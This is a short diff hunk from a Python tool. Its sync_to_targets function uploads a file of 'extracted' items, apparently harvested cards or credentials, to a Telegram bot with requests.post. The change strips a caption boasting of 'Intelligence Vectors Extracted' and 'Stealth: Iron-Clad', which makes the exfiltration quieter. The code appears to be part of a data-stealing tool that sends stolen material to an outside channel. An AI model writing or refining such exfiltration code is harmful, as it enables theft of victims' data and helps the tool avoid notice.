@@ -89,8 +89,7 @@ async def sync_to_targets(cards):
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
         with open(tmp_path, 'rb') as f:
             files = {'document': ('scythe_vectors.txt', f)}
-            caption = f"🎯 THRESHOLD REACHED: {len(cards)} Intelligence Vectors Extracted.\n[Batch Upload | Stealth: Iron-Clad]"
-            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
+            data = {'chat_id': TELEGRAM_CHAT_ID}
             requests.post(url, data=data, files=files)
         os.unlink(tmp_path)
 
